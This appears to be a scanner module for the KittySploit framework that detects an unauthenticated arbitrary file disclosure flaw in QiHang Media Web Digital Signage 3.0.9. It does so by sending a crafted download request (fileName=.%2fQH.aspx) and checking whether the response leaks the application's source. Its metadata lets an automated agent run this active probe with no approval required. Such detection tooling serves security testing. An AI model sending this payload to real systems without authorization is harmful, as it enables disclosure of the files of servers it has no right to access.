#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The QiHang Media Web application suffers from an unauthenticated file disclosure vulnerability when input pass."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'QiHang Media Web (QH.aspx) Digital Signage 3.0.9 - Arbitrary File Disclosure Detection',
        'description': 'The QiHang Media Web application suffers from an unauthenticated file disclosure vulnerability when input passed thru the filename parameter when using the download action or thru path parameter when using the getAll action is not properly verified before being used. This can be exploited to disclose contents of files and directories from local resources.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'qihang', 'lfi', 'disclosure', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5581.php'],
    }

    def run(self):
        path = '/QH.aspx?responderId=ResourceNewResponder&action=download&fileName=.%2fQH.aspx'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Connection': 'close'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('QH.aspx.cs', 'QiHang.Media.Web.QH',)
        header_any = ('filename=QH.aspx', 'application/zip',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='high', reason='QiHang Media Web (QH.aspx) Digital Signage 3.0.9 - Arbitrary File Disclosure detected', path=path)
            return True
        return False

